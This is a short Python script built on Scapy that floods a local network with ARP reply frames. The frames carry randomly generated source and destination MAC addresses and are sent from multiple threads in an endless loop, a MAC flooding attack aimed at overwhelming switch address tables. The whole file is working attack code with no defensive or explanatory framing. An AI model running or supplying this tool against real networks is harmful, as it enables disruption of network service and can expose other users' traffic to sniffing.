from scapy.all import *
from time import sleep
import random
import string
import threading
import os

packetCount = 0

print("Script must run as root")
threads = int(input("Threads: "))

def generateRandomMac():
    return str(random.randint(0,9)) + str(random.randint(0,9)) + ":" + str(random.randint(0,9)) + str(random.randint(0,9)) + ":" + str(random.randint(0,9)) + str(random.randint(0,9)) + ":" + str(random.randint(0,9)) + str(random.randint(0,9)) + ":" + str(random.randint(0,9)) + str(random.randint(0,9)) + ":" + str(random.randint(0,9)) + str(random.randint(0,9))

def sendPacket(sourceMac, destinationMac):
    global packetCount
    sendp(Ether(src=sourceMac,dst=destinationMac)/ARP(op=2, psrc="0.0.0.0", hwdst=destinationMac)/Padding(load="X"*18),verbose = False)
    packetCount = packetCount +1
    print("Packets: " + str(packetCount))
def floodMac():
    while True:
        sendPacket(generateRandomMac(),generateRandomMac())

def startThreads():
    global packetCount
    print("called startthreads")
    for i in range(1,threads):
        print(str(i))
        t = threading.Thread(target=floodMac)
        t.start()

startThreads()
print(generateRandomMac())